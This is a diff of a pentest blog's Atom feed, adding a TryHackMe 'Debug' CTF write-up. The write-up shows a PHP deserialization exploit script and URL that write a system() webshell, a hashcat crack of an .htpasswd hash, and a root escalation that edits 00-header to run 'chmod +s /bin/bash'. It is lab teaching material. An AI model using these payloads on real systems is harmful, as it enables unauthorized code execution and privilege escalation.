@@ -1,4 +1,226 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-06T16:50:17-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">miaulez.rocks</title><subtitle>Ethical Hacking, Penetration Testing, Security, CTFs and more.</subtitle><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><entry><title type="html">eCPPTv2 exam review</title><link href="http://localhost:4000/ecppt-review/" rel="alternate" type="text/html" title="eCPPTv2 exam review" /><published>2022-01-06T00:00:00-05:00</published><updated>2022-01-06T00:00:00-05:00</updated><id>http://localhost:4000/ecppt-review</id><content type="html" xml:base="http://localhost:4000/ecppt-review/">&lt;p&gt;&lt;img src=&quot;/assets/images/reviews/ecppt/thumbnail.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-07T19:32:24-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">miaulez.rocks</title><subtitle>Ethical Hacking, Penetration Testing, Security, CTFs and more.</subtitle><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><entry><title type="html">Debug - Try Hack Me</title><link href="http://localhost:4000/thm-debug-writeup/" rel="alternate" type="text/html" title="Debug - Try Hack Me" /><published>2022-01-07T00:00:00-05:00</published><updated>2022-01-07T00:00:00-05:00</updated><id>http://localhost:4000/thm-debug-writeup</id><content type="html" xml:base="http://localhost:4000/thm-debug-writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hey there, welcome to the write-up for Debug, a TryHackMe box made by ustoun0 which invloves finding a backup directory which has an index.php.bak inside. Doing some code review we can quickly see that the code is vulnerable to php deserialization and we can write a shell on the webserver. Once on the box, we find a .htpasswd file which has James’s hash in it, we crack it using hashcat and then we log in via ssh as James. For root we modify 00-header, we relog via ssh and get a shell as root on the box.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Fri Jan  7 09:31:34 2022 as: nmap -sC -sV -p- -v -oN nmap/debug 10.10.24.151&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.24.151
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.11s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Fri Jan  7 09:34:34 2022 -- 1 IP address (1 host up) scanned in 180.27 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nothing much of interest. Going to the webserver first.&lt;/p&gt;
+
+&lt;h2 id=&quot;webserver&quot;&gt;WebServer&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Just the default Apache page, the source code doesn’t reveal anything. Starting up a gobuster…&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;miaulez㉿pentest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/tryhackme/debug]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.201.232&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php                                         1 ⨯
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://10.10.201.232
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:              php
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2022/01/07 16:59:36 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/index.php            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 5732]
+/javascript           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 319] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.201.232/javascript/]
+/backup               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 315] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.201.232/backup/]    
+/grid                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 313] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.201.232/grid/]      
+Progress: 7538 / 441122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.71%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                      
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Keyboard interrupt detected, terminating.
+                                                                                      
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2022/01/07 16:59:57 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;index.php and backup are the most interesting ones for now, let’s check those out.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s check backup as well&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;index.php.bak sticks out, let’s take a peek inside of it.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;HTML&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;SNIP&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$form_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'message.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SaveMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$NameArea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$EmailArea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$TextArea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'comments'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+	&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Message From : &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$NameArea&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; || From Email : &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$EmailArea&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; || Comment : &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TextArea&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Your submission has been successfully saved!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// Leaving this for now... only for debug purposes... do not touch!&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'debug'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$messageDebug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$application&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$application&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SaveMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;HTML&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;SNIP&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If you can’t tell by looking at the code, there is a massive vulnerability that just waits to be exploited :)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can provide serialized input via debug parameter. If we modify the “public $form_file = ‘message.txt’;” with something like shell.php, and the “public $message = ‘’;” with some php code, serialize it and deserialize it via debug, we can write a webshell on the server and get code execution.&lt;/p&gt;
+
+&lt;p&gt;So I’ve created a little php script which will serialize the first part of the script.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$form_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'message.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We’re going to modify form_file and message with our webshell&lt;/p&gt;
+
+&lt;p&gt;The final script we’re going to use in order to exploit the deserialization vulnerability is this one.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$form_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'shell.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$rce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FormSubmit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let us see how it is done.&lt;/p&gt;
+
+&lt;p&gt;First, we run the exploit script which will serialize our object.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, we take that line and put it in the debug parameter, full url:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.201.232/index.php?debug&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O:10:&lt;span class=&quot;s2&quot;&gt;&quot;FormSubmit&quot;&lt;/span&gt;:2:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;s:9:&lt;span class=&quot;s2&quot;&gt;&quot;form_file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:9:&lt;span class=&quot;s2&quot;&gt;&quot;shell.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:7:&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:34:&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&quot;&lt;/span&gt;cmd&lt;span class=&quot;s2&quot;&gt;&quot;]); ?&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing has happened, we’re getting the same page, let’s see if shell.php has been written on the server.&lt;/p&gt;
+
+&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Indeed, we do have code execution. Let’s get a reverse shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;First things first, let’s stabilize our shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the same directory we’ve landed our webshell, there is a hidden file called .htpasswd. In it we’ve got what it looks like a hash and a username called “james” which is a user on the box.&lt;/p&gt;
+
+&lt;p&gt;![]/assets/images/thm/debug/10-1.png)&lt;/p&gt;
+
+&lt;p&gt;Let’s try cracking that hash with hashcat. First, let’s find out what mode is needed to crack that specific hash. For that, I’m gonna go to example_hashes from hashcat’s website and search for apr1.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, I’m going to save the hash in a file called simply “hash” and crack it using rockyou.txt&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1600 &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; /usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The hash cracks almost instantly. We can now try to log in via ssh as james.&lt;/p&gt;
+
+&lt;h2 id=&quot;user&quot;&gt;User&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Note-To-James.txt:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we remember correctly, when we’ve logged in via ssh, a banner appears running some uname -r things&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That’s because of 00-header, a bash script that runs when somebody connects via ssh to a system. We can find where that is by running find with some switches to show us just files owned by root which we can modify.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-writable&lt;/span&gt; 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s take a look at 00-header&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s modify from “$(uname -o) into “$(chmod +s /bin/bash)” and relog&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since ssh runs as root and that bash script executes as root, we should set a suid bit on bash, thus running bash -p will give us a root shell.&lt;/p&gt;
+
+&lt;h2 id=&quot;rooted&quot;&gt;Rooted&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/debug/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
